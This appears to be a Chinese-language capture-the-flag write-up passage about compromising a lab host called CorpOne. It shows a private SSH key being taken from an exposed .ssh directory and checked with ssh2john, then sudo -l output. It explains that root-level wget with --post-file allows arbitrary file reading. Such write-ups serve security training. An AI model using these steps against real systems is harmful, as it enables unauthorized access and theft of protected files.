访问 /.ssh，有一个 id_rsa 文件，将私钥复制到本机，赋予 600 权限，用 ssh2john 转化为哈希格式，结果提示无密码

┌──(root㉿kali)-[~/桌面]
└─# chmod 600 id_rsa       
                                                                                                                                   
┌──(root㉿kali)-[~/桌面]
└─# ssh2john id_rsa > id_rsa.hash
id_rsa has no password!

那就直接登录，用户名之前在注释里面有一个 jessie

用户可以以 root 权限执行 /usr/bin/wget 命令

可以利用 wget 命令的文件下载功能，并结合其 --post-file 选项，来实现任意文件读取

jessie@CorpOne:~$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
jessie@CorpOne:~$ sudo su -
[sudo] password for jessie:

结合之前的文件命名方式，猜测 root 的 flag 文件名是 root_flag.txt
